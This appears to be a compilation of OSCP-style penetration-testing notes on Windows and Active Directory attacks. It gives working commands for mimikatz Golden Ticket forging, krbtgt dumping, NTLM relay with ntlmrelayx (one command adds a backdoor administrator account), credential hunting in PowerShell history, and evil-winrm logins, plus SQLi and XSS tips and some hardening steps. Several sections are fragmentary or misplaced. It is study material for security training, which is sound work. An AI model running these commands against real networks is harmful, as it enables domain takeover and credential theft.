docs.title: Takeaway From the reports I found
Takeaway #1: Enumerate Versions, Not Just Ports. Don't just find open doors; find out exactly what kind of door it is. Use scan options like nmap -sV to aggressively probe for service versions.

Takeaway #2: Use searchsploit First, but Master Google Fu. Your local searchsploit is the quickest way to find public exploits. If that fails, use precise Google searches (e.g., "vsftpd 2.3.4" exploit PoC github") to find less-official, but potentially working, code.

Takeaway #3: Never Run Public Exploits Blindly. Always read the source code of an exploit before running it. Understand how it works, what it does to the target, and what you need to modify (like IP addresses and ports) for it to work correctly.

docs.title: NetBIOS (Network Basic Input/Output System)
docs.text:
Purpose

Allows applications on separate computers to communicate over a LAN.

Ports:

Port Protocol Service 137 UDP/TCP Name service for registration and resolution 138 UDP Datagram distribution service (connectionless) 139 TCP Session service (connection-oriented)

Enumeration Value

Can reveal domain names, workgroup names, system names, and MAC addresses.

docs.title: SMB (Server Message Block)
docs.text:
Purpose

A network file sharing protocol for shared access to files, directories, printers, and other network resources.

Ports:

  • 445/tcp - Modern SMB running directly over TCP/IP
  • 139/tcp - Legacy SMB running with NetBIOS over TCP/IP

Default Administrative Shares:

Share Purpose ADMIN$ Remote administration C$ Access to the root of the C: drive volume IPC$ Inter-Process Communication - shares named pipes NETLOGON Stores logon scripts (Domain Controllers) SYSVOL Stores group policy and replicated files (Domain Controllers)

docs.title: MSRPC (Microsoft Remote Procedure Call)
docs.text:
Purpose

A protocol used by a client to request a service from a program on a remote server as if it were a local call. Backbone for most remote Windows administration.

Port: TCP/UDP 135 (RPC Endpoint Mapper)

MSRPC Over SMB (Named Pipes):

Named Pipe Service Capabilities \pipe\lsarpc Local Security Authority (LSA) Enumerate SIDs, policies, trust relationships \pipe\samr Local SAM Database Enumerate domain/local users and groups \pipe\svcctl Service Control Manager Remotely manage services \pipe\atsvc Task Scheduler Remotely manage scheduled tasks \pipe\winreg Remote Registry Service Access remote registry

docs.title: AS-REP Roasting Attacks
docs.text:
Attack Overview

Targets users with Kerberos pre-authentication disabled, allowing offline password cracking.

docs.title: Understanding the Attack
docs.text:
Kerberos Pre-Authentication:

  • Default security feature requiring users to prove password knowledge
  • Attacker can request authentication data without a password if disabled
  • KDC returns encrypted TGT (AS-REP message) encrypted with user's NTLM hash

Goal: Capture AS-REP hash and crack it offline.

docs.text:
Use Case

After gaining SYSTEM-level access where a privileged domain user has an active session.

docs.title: Understanding Access Tokens
docs.text:
Access Tokens:

  • Generated upon successful authentication
  • Identify user, groups, and privileges
  • Stored by LSASS until system restart

Delegation Tokens:

  • Created from interactive logons (RDP, physical)
  • Primary targets for impersonation

docs.title: A. Golden Ticket Attack
docs.text:
Impact

Complete and persistent control over entire domain.

What is it?

Forged Ticket-Granting Ticket (TGT) allowing authentication as any user with any privileges.

Prerequisites

  • Domain Admin privileges on DC
  • krbtgt account's NTLM hash
  • Domain Name
  • Domain SID

docs.title: Step 1: Gather Required Information
docs.text:
privilege::debug
lsadump::lsa /inject /name:krbtgt

Note

Dumps krbtgt account details including NTLM hash and Domain SID.

docs.title: Step 2: Forge and Inject the Golden Ticket
docs.text:
kerberos::golden /user:<SPOOFED_USERNAME> /domain:<DOMAIN_NAME> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTHASH> /id:500 /ptt

Parameters:

Parameter Description /user Any name, even non-existent (Administrator is common) /id RID of user to impersonate (500 = default Administrator) /ptt Inject ticket directly into current session

docs.title: Step 3: Use the Ticket
docs.text:
Spawn CMDAccess SharesGet SYSTEM Shell

dir \\<OTHER_HOST>\C$

.\PsExec64.exe -accepteula \\<OTHER_HOST> -s cmd

docs.text:

# Forge ticket

# Use ticket

docs.title: B. Silver Ticket Attack
docs.text:
Overview

Forged Ticket-Granting Service (TGS) ticket limited to specific service on specific server. Stealthier than Golden Ticket.

Prerequisites

  • Admin/SYSTEM privileges on target server
  • NTLM hash of service account (e.g., HOSTNAME$)
  • Service Principal Name (SPN)
  • Domain Name and Domain SID

docs.title: Step 1: Gather Required Information
docs.text:
• Obtain service account hash (dump LSASS on target)
  • Get domain SID: wmic useraccount get name,sid

docs.title: Step 2: Forge and Inject Silver Ticket
docs.text:

Note

This example forges a ticket for CIFS (file share) service.

docs.title: Step 3: Use the Ticket

docs.title: Overview
docs.text: NTLM Relay attacks exploit the NTLM authentication protocol by intercepting and relaying authentication requests to target systems. This allows attackers to authenticate as legitimate users without knowing their passwords.

docs.title: Required Tools
docs.text:
• Responder - LLMNR/NBT-NS/MDNS poisoner
  • ntlmrelayx (Impacket) - NTLM relay tool
  • Proxychains (optional) - For pivoting
  • CrackMapExec - Post-exploitation and verification
  • mitm6 - IPv6 DHCP spoofing for relay

docs.title: Installation
docs.text:
# Install Impacket
sudo apt install impacket-scripts
# OR from source
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .

# Install Responder
sudo apt install responder
# OR from source
git clone https://github.com/lgandx/Responder.git

# Install mitm6
sudo apt install mitm6
# OR
pip install mitm6

# Install CrackMapExec
sudo apt install crackmapexec

docs.title: What is NTLM Relay?
docs.text:
NTLM Relay works by:

  1. Intercepting authentication attempts (via LLMNR/NBT-NS poisoning or mitm6)
  2. Relaying those credentials to target systems
  3. Authenticating to services on behalf of the victim
  4. Executing commands or dumping credentials

docs.title: Requirements for Success
docs.text: ✅ SMB Signing must be disabled or not required on target ✅ Valid network credentials being relayed ✅ Relayed user must have admin rights on target (for most attacks) ✅ Network connectivity between attacker and targets

docs.title: Common Attack Scenarios
docs.text:
1. SMB to SMB - Relay SMB auth to another SMB service
  2. HTTP to SMB - Relay HTTP auth to SMB
  3. LDAP to LDAP - Relay to domain controller LDAP
  4. SMB to LDAPS - Relay to secure LDAP for DCSync

crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

nmap --script smb2-security-mode.nse -p445 192.168.1.0/24

Manual Check with Nmap: 

nmap -p445 --script smb-security-mode 192.168.1.100

Look for: 

| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   message_signing: disabled (dangerous, but default)

# Relay and dump SAM hashes
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Relay with specific command

Interactive Shell:

SOCKS Proxy:

# Use with proxychains
proxychains smbclient //192.168.1.100/C$
proxychains secretsdump.py DOMAIN/USER@192.168.1.100

Advanced Options: 

# Relay to specific target
sudo ntlmrelayx.py -t 192.168.1.100 -smb2support

# Relay and execute specific commands
sudo ntlmrelayx.py -tf targets.txt -smb2support \
  -c "net user hacker Passw0rd! /add && net localgroup Administrators hacker /add"

docs.title: Common Issues
docs.text:
1. "SMB Signing is required" 

Solution: Target doesn't support relay, try different targets

2. "Access Denied" 

Solution: Relayed user doesn't have admin rights on target
Try different targets or wait for different user

3. "Connection Timeout" 

Solution: Check network connectivity and firewall rules
Verify targets are online: nmap -Pn -p445 <target>

4. "Responder not capturing hashes" 

Solution:
- Verify SMB/HTTP are OFF in Responder.conf
- Check interface: ip addr show
- Ensure you're on the correct network segment

5. "ntlmrelayx not relaying" 

Solution:
- Verify SMB2 support: --smb2support
- Check targets list is valid
- Ensure Responder is running first

docs.title: Enable SMB Signing
docs.text:
Via Group Policy: 

Computer Configuration -> Policies -> Windows Settings -> 
Security Settings -> Local Policies -> Security Options

Set:
- "Microsoft network client: Digitally sign communications (always)" = Enabled
- "Microsoft network server: Digitally sign communications (always)" = Enabled

Via Registry: 

Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters" `
  -Name "RequireSecuritySignature" -Value 1

docs.title: Disable LLMNR and NBT-NS
docs.text:
Disable LLMNR via Group Policy: 

Computer Configuration -> Administrative Templates -> 
Network -> DNS Client -> Turn off multicast name resolution = Enabled

Disable NBT-NS:

  • [ ] Tested read access to /etc/shadow
  • [ ] Tested write access to /etc/passwd
  • [ ] Tested write access to /etc/sudoers
  • [ ] Tested read access to /root directory

docs.title: Foundational Security Concepts
docs.text:
Essential Background Knowledge

Understanding these concepts is critical before attempting any privilege escalation attacks. These explain the "why" behind the techniques.

docs.title: Understanding Security Identifiers (SID)
docs.text:
Windows uses SIDs rather than usernames for all security decisions. Each user and group has a unique SID that defines their security context.

Your objective is to obtain an access token associated with a privileged SID.

Important SID Values

  • S-1-5-...-500: Local Administrator account
  • S-1-5-18: NT AUTHORITY\SYSTEM (highest privilege level - primary target)
  • S-1-5-11: Authenticated Users group
  • RID > 1000: Regular user accounts and custom groups

docs.title: Access Tokens & Integrity Levels
docs.text:
When you authenticate, Windows creates an access token containing your SID, group memberships, and assigned privileges. All processes you launch inherit this token.

Mandatory Integrity Control (MIC) ranks processes by trustworthiness:

Level Description Low Sandboxed environments (browser tabs, untrusted processes) Medium Standard user context - your typical starting point High Administrator context - initial escalation target System Kernel and critical system services

Critical Restriction

Lower integrity processes cannot modify higher integrity objects, regardless of file permissions. Escalation requires moving from Medium → High → System.

docs.title: User Account Control (UAC) Mechanism
docs.text:
UAC splits administrator privileges into two separate tokens:

  • Standard token (Medium integrity) - used by default for routine operations
  • Privileged token (High integrity) - requires UAC prompt approval

Many privilege escalation techniques focus on bypassing the UAC prompt to access the privileged token without user interaction.

docs.title: Initial System Reconnaissance
docs.text:
Start Here

Complete this reconnaissance immediately after gaining initial access. Never begin exploitation without this intelligence.

Primary Objectives

Map the system landscape, identify user accounts, understand the machine's role, and locate potential attack vectors.

docs.title: Privilege & Group Enumeration
docs.text:
Determine group memberships and integrity level:

whoami /groups

Critical Group Memberships:

  • BUILTIN\Administrators: Full administrative access (rare initially)
  • BUILTIN\Remote Desktop Users: RDP access capability
  • BUILTIN\Backup Operators: Read/write access bypassing ACLs
  • Custom groups: IT-Support, Helpdesk, PowerUsers may have elevated permissions

Integrity Check: Confirm Mandatory Label\Medium Mandatory Level indicates standard user requiring escalation.

docs.title: Credential Hunting Techniques
docs.text:
Execution Timing

Begin after completing initial reconnaissance. Use discovered information (installed software, usernames) to guide your search patterns.

Mission Objective

Locate plaintext credentials, API keys, or configuration secrets enabling lateral movement or direct privilege escalation.

docs.title: Filesystem Credential Search
docs.text:
Systematically search for files containing sensitive data, focusing on application directories and user spaces.

PowerShell Recursive Search:

Get-ChildItem -Path [START_DIRECTORY] -Include [FILE_TYPES] -File -Recurse -ErrorAction SilentlyContinue

Parameter Breakdown:

Parameter Purpose -Path Search starting point: C:\, C:\Users\alice\Desktop -Include Target patterns: *.txt,*.xml,*.config,*.ini -Recurse Traverse all subdirectories -ErrorAction SilentlyContinue Suppress access denied errors

High-Value Locations:

  • User directories: C:\Users\, C:\Users\Public\
  • User data: Desktop, Documents, Downloads folders
  • Application data: C:\Program Files\, C:\ProgramData\
  • Web roots: C:\inetpub\wwwroot\, C:\xampp\htdocs\

Target File Types:

Category Examples Password Databases *.kdbx, passwords.txt, credentials.txt Configuration web.config, app.config, *.ini, database.xml Documents *.docx, *.xlsx - onboarding guides, IT procedures Scripts *.ps1, *.bat, *.vbs - automation with hardcoded credentials

Reading Discovered Files:

CMDPowerShell 
type C:\path\to\file.txt

cat C:\path\to\file.txt

docs.title: Credential Exploitation
docs.text:
Once credentials are discovered, verify the account and determine access methods.

Validation Process:

  1. Locate credential pair - Example: username: robert / password: P@ssw0rd2024!#

  2. Verify account exists and check permissions:

    net user robert

  3. Determine access method based on group membership:

    Remote Desktop Access (Remote Desktop Users group):

    xfreerdp /v:192.168.1.50 /u:robert /p:'P@ssw0rd2024!#'

    PowerShell Remoting (Remote Management Users group):

    evil-winrm -i 192.168.1.50 -u robert -p 'P@ssw0rd2024!#'

    Local Administrator (no remote access):

    From an existing GUI session, escalate privileges:

    runas /user:adminaccount cmd

    Enter password when prompted for elevated command prompt.

docs.title: Iterative Enumeration Cycle
docs.text:
Critical OSCP Concept

After successfully switching users, restart the entire enumeration process with the new security context.

Rationale: Different users have different file permissions. Previously inaccessible files may now be readable.

Real-World Scenario

User alice received "Access Denied" on database.xml. After RDP access as robert, the file was readable and contained dbadmin credentials, leading to complete system compromise.

Core Principle

Every new user context is a new opportunity. Never assume enumeration is complete.

docs.title: PowerShell Artifact Analysis
docs.text:
Timing & Context

Execute during enumeration after filesystem searches. Administrator PowerShell usage often leaves exploitable artifacts due to poor operational security.

Strategic Goal

Extract credentials and sensitive data from PowerShell's persistent logging mechanisms that administrators assume are cleared or invisible.

docs.title: PSReadLine History Exploitation
docs.text:
Target the persistent history file, not the ephemeral session history.

Common Administrator Misconception

Get-History only shows current session data. Running Clear-History does NOT remove the persistent file.

Persistent History Reality: The PSReadLine module maintains a complete command history across sessions and reboots, surviving Clear-History attempts.

One-Line Extraction:

type ((Get-PSReadlineOption).HistorySavePath)

Standard Location

C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

High-Value Artifacts:

  • Plaintext credentials: $pass = "MyS3cr3tP@ss", ConvertTo-SecureString "admin123"
  • PSCredential construction: New-Object System.Management.Automation.PSCredential
  • Remote connections: Enter-PSSession, Invoke-Command with inline credentials
  • Transcript activation: Start-Transcript -Path "C:\Logs\session.txt" reveals additional log locations

docs.title: PowerShell Transcript Discovery
docs.text:
Transcripts provide complete session recordings - every command and all output. The ultimate intelligence source.

Discovery Methods:

  1. Direct reference - Check PSReadLine history for Start-Transcript commands showing exact paths

  2. Filesystem sweep:

    Get-ChildItem -Path C:\ -Include *transcript*.txt -File -Recurse -ErrorAction SilentlyContinue

Critical Intelligence (Jackpot Scenarios):

Transcripts capture complete PSCredential object creation that may be sanitized in history files.

Transcript Gold Mine

**********************
PS> $secpass = ConvertTo-SecureString "SuperSecure2024!" -AsPlainText -Force
PS> $credential = New-Object System.Management.Automation.PSCredential("adminuser", $secpass)
PS> Enter-PSSession -ComputerName SRV-FILE01 -Credential $credential
**********************

Result: Direct access to adminuser account with password SuperSecure2024!

docs.title: WinRM Credential Exploitation
docs.text:
Leverage discovered credentials for remote access via Windows Remote Management.

Detection Indicator

Presence of Enter-PSSession or Invoke-Command in logs indicates WinRM is active and accessible.

Tool Selection: evil-winrm from Kali Linux

Connection Syntax:

evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>'

Practical Example

evil-winrm -i 10.10.50.100 -u adminuser -p 'SuperSecure2024!'

Shell Special Character Handling

Always use single quotes around passwords containing special characters (!, @, #, $, &) to prevent shell interpretation errors on Linux.

docs.title: OSCP Exam Tips
docs.text:
1. Always test for SQLi on any input fields (GET/POST parameters, cookies, headers)
  2. Check for different database types - MySQL and MSSQL have different syntax
  3. Try both error-based and blind techniques if error messages are suppressed
  4. Use time-based blind injection when boolean-based doesn't work
  5. Look for command execution via xp_cmdshell (MSSQL) or LOAD_FILE/INTO OUTFILE (MySQL)
  6. Extract credentials from database and try password reuse
  7. Document all findings including database version, table names, and extracted data
  8. Try file read/write to access configuration files or upload web shells
  9. Be patient with blind injection - it takes time but works reliably
  10. Use sqlmap wisely - understand what it's doing, manual testing is often faster for OSCP

docs.title: Overview
docs.text: Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. This cheatsheet covers practical XSS techniques for OSCP exam scenarios.

docs.title: Quick Detection Checklist
docs.text:
• [ ] Test all input fields (search, comments, forms)

  • [ ] Look for reflected input in HTML, JavaScript, attributes

  • [ ] Test file upload features (filename, content)
  • [ ] Examine DOM-based sinks (innerHTML, eval, document.write)

docs.title: 1. Reflected XSS

Payload is reflected immediately in the response 

Victim clicks malicious link → Server reflects payload → Executes in browser

Payload is stored on server and served to multiple users 

Attacker stores payload → Server saves to database → Other users view page → Executes

docs.title: 3. DOM-Based XSS

Payload executes through DOM manipulation 

Payload in URL fragment → JavaScript processes it → Executes without server interaction

docs.text:
CMDPowerShell 
:: Check permissions for a specific file
icacls "C:\path\to\your\file.txt"

:: Check permissions for a specific folder
icacls "C:\path\to\your\folder"

:: Save permissions to a file for backup/review
icacls "C:\path\to\your\folder" /save C:\temp\permissions.txt

:: To restore permissions from the file

:: To grant permission to a file /t - set recursevely | /c - continue when error

# Get permissions (ACL) for a specific file
Get-Acl C:\path\to\your\file.txt

# Display the Access Control List (ACL) in a more readable list format
Get-Acl C:\path\to\your\file.txt | Format-List

# View just the access rules for a file or folder
(Get-Acl C:\path\to\your\folder).Access

# List permissions for all items in a directory and format as a table
Get-ChildItem C:\path\to\your\folder | ForEach-Object { Get-Acl $_.FullName } | Select-Object Path, Owner, Group

Understanding Windows Permissions

Permissions in Windows are managed through Access Control Lists (ACLs). Each file and folder has an ACL, which is a list of Access Control Entries (ACEs). Each ACE specifies which user or group has what kind of access.

Common Permission Codes:

icacls Code PowerShell Name Description (F) FullControl Full control. Users can modify, add, move, and delete files, as well as change permissions. (M) Modify Modify. Users can read, write, modify, and delete files and subfolders. (RX) ReadAndExecute Read and execute. Users can view file contents and run applications. (R) Read Read. Users can view file contents and properties. (W) Write Write. Users can write to a file or add files to a folder. (D) Delete Delete. Users can delete a file or folder.

Special Permission Flags:

  • CI (Container Inherit): Subfolders will inherit these permissions.
  • OI (Object Inherit): Files within the folder will inherit these permissions.

Mandatory Integrity Levels

Windows uses Mandatory Integrity Control (MIC) to restrict access based on integrity levels. These appear in icacls output and determine what processes can interact with files/folders.

Integrity Levels (Lowest to Highest):

Level Code Description Typical Use Untrusted (NW) Lowest integrity level Rarely used, severely restricted Low (LW) Low integrity Internet-facing applications, sandboxed browsers Medium (MW) Medium integrity (default) Standard user processes, most applications High (HW) High integrity Administrative processes, elevated applications System (SW) System integrity Core Windows services, kernel-mode processes

Why This Matters for Privilege Escalation:

  • A Medium integrity process cannot modify High integrity files, even if ACL permissions allow it
  • If you have a Medium integrity shell but are in the Administrators group, you're restricted by UAC
  • Check your current integrity level: whoami /groups | findstr "Mandatory"
  • Files/folders with Low or Medium mandatory levels are easier targets for modification

Example icacls Output: 

C:\temp\file.txt NT AUTHORITY\SYSTEM:(I)(F)
                 BUILTIN\Administrators:(I)(F)
                 BUILTIN\Users:(I)(RX)
                 Mandatory Label\Medium Mandatory Level:(NW)

The last line shows the integrity level - in this case, Medium Mandatory Level with No Write-up (NW), meaning lower-integrity processes cannot write to this file.
